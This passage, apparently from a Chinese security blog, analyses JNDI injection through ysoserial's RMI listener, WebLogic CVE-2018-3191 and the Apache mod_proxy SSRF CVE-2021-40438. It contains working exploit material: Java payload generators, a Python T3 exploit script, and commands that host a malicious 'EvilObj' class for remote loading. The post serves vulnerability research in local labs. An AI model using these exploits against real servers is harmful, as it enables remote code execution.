java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.MarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UID;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic JRMP listener</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span></span><br><span class="line"><span class="comment"> * client connecting to it and making a call.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIRefWithHttpServerListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(  String[] args )</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( args.length &lt; <span class="number">4</span> ) &#123;</span><br><span class="line">            System.err.println(RMIRefWithHttpServerListener.class.getName() + <span class="string">&quot;&lt;registryHost:registryPort&gt; &lt;PayloadServerPort&gt; &lt;factory_name&gt; &lt;command&gt;&quot;</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.setProperty(<span class="string">&quot;sun.rmi.transport.tcp.logLevel&quot;</span>,<span class="string">&quot;BRIEF&quot;</span>);</span><br><span class="line">        String[] registry = args[<span class="number">0</span>].split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> registryPort = Integer.parseInt(registry[<span class="number">1</span>]);</span><br><span class="line">        String host = registry[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> httpServerPort = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        String factoryURL = <span class="string">&quot;http://&quot;</span>+host+<span class="string">&quot;:&quot;</span>+httpServerPort+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        String factoryName = args[<span class="number">2</span>];</span><br><span class="line">        String command = args[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        int registryPort = 9999;</span></span><br><span class="line"><span class="comment">//        String host = &quot;localhost&quot;;</span></span><br><span class="line"><span class="comment">//        int httpServerPort = 80;</span></span><br><span class="line"><span class="comment">//        String factoryName = &quot;EvilObj&quot;;</span></span><br><span class="line"><span class="comment">//        String factoryURL = &quot;http://&quot;+host+&quot;:&quot;+httpServerPort+&quot;/&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        String command = &quot;touch aaa&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(factoryName,factoryName,factoryURL);</span><br><span class="line">        <span class="keyword">final</span> Object payloadObject = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PayloadClassFileHTTPServer server = <span class="keyword">new</span> PayloadClassFileHTTPServer(httpServerPort, factoryName, command);</span><br><span class="line">            server.run();</span><br><span class="line"></span><br><span class="line">            System.err.println(<span class="string">&quot;* URL: rmi://&quot;</span>+host+<span class="string">&quot;:&quot;</span>+registryPort+<span class="string">&quot;/&quot;</span>+factoryName);</span><br><span class="line">            System.err.println(<span class="string">&quot;* FactoryURL: &quot;</span> + factoryURL);</span><br><span class="line">            System.err.println(<span class="string">&quot;* Opening JRMP listener on &quot;</span> + registryPort);</span><br><span class="line"></span><br><span class="line">            RMIRefListener c = <span class="keyword">new</span> RMIRefListener(registryPort, payloadObject);</span><br><span class="line">            c.run();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Listener error&quot;</span>);</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(args[<span class="number">1</span>], payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>命令如下</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefWithHttpServerListener [registry_IP:registry_PORT] [LDAP_Port] [EvilObj_name] [command]</span><br></pre></td></tr></table></div></figure>


        <h4 id="client"   >
          <a href="#client" class="heading-link"><i class="fas fa-link"></i></a><a href="#client" class="headerlink" title="client"></a>client</h4>
      <p>本地访问一下就行</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi://[registry_IP]:[registry_Port]/EvilObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的两行代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>是在某个新的<code>JDK</code>之后由于<code>com.sun.jndi.ldap.object.trustURLCodebase</code>和<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认设置为<code>false</code>，导致无法利用<code>RMI</code>机制以及<code>LDAP</code>机制。当没有设置时，进行<code>lookup</code>调试后会进入如下判断</p>
<ul>
<li><p><code>RMI</code>判断</p>
<p><code>RegistryContext#decodeObject</code>判断<code>com.sun.jndi.rmi.object.trustURLCodebase</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163219141.png" alt="image-20230211163219141"></p>
</li>
<li><p><code>LDAP</code>判断</p>
<p><code>NamingManager#getObjectFactoryFromReference</code>进入<code>VersionHelper12#loadClass</code>判断<code>com.sun.jndi.ldap.object.trustURLCodebase</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163527766.png" alt="image-20230211163527766"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163544591.png" alt="image-20230211163544591"></p>
</li>
</ul>
<p>所以这里将其设置为<code>true</code>，或者命令行也行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></div></figure>

<p>详细看下图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211124056681.png" alt="image-20230211124056681"></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://y4er.com/posts/attack-java-jndi-rmi-ldap-2/#jndi%E6%B3%A8%E5%85%A5" >攻击Java中的JNDI、RMI、LDAP(二) - Y4er的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="CVE-2018-3191"   >
          <a href="#CVE-2018-3191" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h3>
      <p><code>Weblogic</code>中关于<code>JNDI</code>注入的，比较原始的应该就算这个洞了吧。</p>

        <h4 id="环境搭建-2"   >
          <a href="#环境搭建-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h4>
      <p>也是类似的，用<code>vulhub</code>的，就用<code>CVE-2018-2628</code>的<code>Weblogic</code>，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-1" >https://xz.aliyun.com/t/10172#toc-1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>记得最后把<code>docker</code>重启一下就行</p>

        <h4 id="漏洞分析-2"   >
          <a href="#漏洞分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4>
      
        <h5 id="调试准备"   >
          <a href="#调试准备" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试准备" class="headerlink" title="调试准备"></a>调试准备</h5>
      <ul>
<li><p>本地准备</p>
<p>生成在<code>T3</code>协议中进行反序列化的<code>JtaTransactionManager</code>类，该类不在<code>T3</code>协议的黑名单中，可以被反序列化，如下代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String jndiAddress = <span class="string">&quot;rmi://[registry_IP]:[registry_Port]/EvilObj&quot;</span>;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line">        ser(jtaTransactionManager, <span class="string">&quot;CVE_2018_3191.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>上述代码参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中的<code>JtaTransactionManager</code>类是在<code>Weblogic</code>中的，将<code>Weblogic</code>中的<code>modules</code>打包出来放在<code>IDEA</code>中加载即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211154619832.png" alt="image-20230211154619832"></p>
<p>相关的<code>EXP</code>如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换 </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget,cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFilePayload</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span></span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment">#payload的长度四字节无符号整数</span></span><br><span class="line">    payloadLen = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#头部某些地方改掉也没关系，估计是只检测了一部分</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#反序列化标志，这个不能改</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payloadLen + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    <span class="comment">#gadget = &quot;JNDI&quot;</span></span><br><span class="line">    <span class="comment">#command = &quot;xxx:xxx&quot;</span></span><br><span class="line">    <span class="comment">#payload = generatePayload(gadget, command)</span></span><br><span class="line">    payload = getFilePayload(<span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial/CVE_2018_3191.ser&quot;</span>)</span><br><span class="line">    T3Exploit(host, port, payload)</span><br></pre></td></tr></table></div></figure></li>
<li><p>服务器准备</p>
<p>使用如下代码搭建</p>
<ul>
<li><p><code>registry</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 9999 EvilObj http://[LDAP_IP]/</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>LDAP</code>服务</p>
<p>将<code>EvilObj.class</code>放在该目录下</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>
<p>需要注意的是，这里<code>CVE-2018-2628</code>中的<code>Weblogic</code>其<code>java</code>环境是<code>1.6.0_45</code>，而如果服务器中的<code>java</code>环境大于此版本，其生成的<code>EvilObj</code>就无法被成功解析，会出现如下版本不匹配问题，导致无法完成漏洞利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211165742189.png" alt="123421"></p>
<p>而高版本解析低版本则没有什么关系，所以一般需要找对应版本的<code>java</code>来生成<code>EvilObj</code>然后挂载到服务器上。</p>
<p>最后有如下结果所示，然后版本也没有不匹配就应该差不多了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211164042119.png" alt="image-20230211164042119"></p>

        <h5 id="具体分析"   >
          <a href="#具体分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h5>
      <p>漏洞点出在<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code>中调用了<code>initUserTransactionAndTransactionManager</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155605398.png" alt="image-20230211155605398"></p>
<p>继续跟进<code>initUserTransactionAndTransactionManager</code>，判断一下<code>this.userTransactionName</code>就会调用到<code>this.lookupUserTransaction</code>函数，而<code>this.userTransactionName</code>在反序列化中是可控的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155652699.png" alt="image-20230211155652699"></p>
<p><code>this.lookupUserTransaction</code>函数中会调用到<code>JndiTemplate#lookup</code>函数，并且以<code>userTransactionName</code>作为参数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155802378.png" alt="image-20230211155802378"></p>
<p><code>JndiTemplate#lookup</code>函数中会再调用一次本类中单个<code>name</code>参数的<code>lookup</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160058002.png" alt="image-20230211160058002"></p>
<p>在该单个<code>name</code>参数的<code>lookup</code>函数中找到最终的漏洞根源，使用了<code>Context</code>的<code>lookup</code>函数来远程加载恶意类，该<code>name</code>就是<code>JtaTransactionManager.userTransactionName</code>，是可控的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160128732.png" alt="image-20230211160128732"></p>
<p>这个<code>this.execute</code>就会调用到这里重写的<code>doInContext</code>函数，触发漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160717241.png" alt="image-20230211160717241"></p>

        <h1 id="HTTPD-Apache"   >
          <a href="#HTTPD-Apache" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTPD-Apache" class="headerlink" title="HTTPD(Apache)"></a>HTTPD(Apache)</h1>
      
        <h2 id="CVE-2021-40438"   >
          <a href="#CVE-2021-40438" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2021-40438" class="headerlink" title="CVE-2021-40438"></a>CVE-2021-40438</h2>
      <p><code>Apache</code>版本小于<code>2.4.48</code>，由于代理模块<code>mod_proxy</code>的漏洞，可以造成<code>Apache</code>的<code>SSRF</code>，需要开启如下两个模块</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br></pre></td></tr></table></div></figure>

<p>即在<code>/conf/httpd.conf</code>中注释掉</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214103829499.png" alt="image-20230214103829499"></p>

        <h3 id="环境搭建-3"   >
          <a href="#环境搭建-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>参考<code>P</code>神的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/418885442584848" >编译调试 Apache</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="漏洞分析-3"   >
          <a href="#漏洞分析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>相关的漏洞链条如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mod_proxy.c/proxy_handler</span><br><span class="line">proxy_util.c/ap_proxy_pre_request</span><br><span class="line">proxy_util.c/fix_uds_filename</span><br></pre></td></tr></table></div></figure>

<p>同样也是参考<code>P</code>神的：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html" >Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>断点下在<code>modules/proxy/proxy_util.c</code>的<code>fix_uds_filename</code>函数头部</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214104203749.png" alt="image-20230214104203749"></p>
<p>随便发送一个数据包访问一下即可断下来，该函数相关注释如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_uds_filename</span><span class="params">(request_rec *r, <span class="keyword">char</span> **url)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr, *ptr2;</span><br><span class="line">    <span class="keyword">if</span> (!r || !r-&gt;filename) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(r-&gt;filename, <span class="string">&quot;proxy:&quot;</span>, <span class="number">6</span>) &amp;&amp;</span><br><span class="line">            (ptr2 = ap_strcasestr(r-&gt;filename, <span class="string">&quot;unix:&quot;</span>)) &amp;&amp;</span><br><span class="line">            (ptr = ap_strchr(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">apr_uri_t</span> urisock;</span><br><span class="line">        <span class="keyword">apr_status_t</span> rv;</span><br><span class="line">        *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);</span><br><span class="line">        <span class="keyword">if</span> (rv == APR_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">char</span> *rurl = ptr+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">            apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br><span class="line">            *url = apr_pstrdup(r-&gt;pool, rurl); <span class="comment">/* so we get the scheme for the uds */</span></span><br><span class="line">            <span class="comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span></span><br><span class="line">            memmove(r-&gt;filename+<span class="number">6</span>, rurl, <span class="built_in">strlen</span>(rurl)+<span class="number">1</span>);</span><br><span class="line">            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="number">0</span>, r,</span><br><span class="line">                    <span class="string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,</span><br><span class="line">                    sockpath, *url, r-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *ptr = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>首先关注的一点是<code>r-&gt;filename</code>，这里我输入的<code>url</code>是<code>http://127.0.0.1:4444/?aaaaaa</code>，其<code>r-&gt;filename</code>相关值如下，为<code>proxy:http://192.168.1.1/?aaaaaa</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105305206.png" alt="image-20230214105305206"></p>
<p>即将我们设置中的代理和用户的输入<code>url</code>路径进行了拼接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105328864.png" alt="image-20230214105328864"></p>
<p>也就是说这个<code>r-&gt;filename</code>是一部分可控的。</p>
<p>那么依据在<code>fix_uds_filename</code>函数的第二个<code>if</code>判定以及相关的函数注释</p>
<ul>
<li><p><code>ap_strcasestr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105601093.png" alt="aaa"></p>
</li>
<li><p><code>ap_strchr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105648945.png" alt="image-20230214105648945"></p>
</li>
</ul>
<p>那么即可推导出进入该<code>if</code>的条件</p>
<ul>
<li><code>r-&gt;filename</code>的前6个字符等于<code>proxy:</code></li>
<li><code>r-&gt;filename</code>的字符串中含有字串<code>unix:</code></li>
<li><code>unix:</code>字串的后面部分含有字符<code>|</code></li>
</ul>
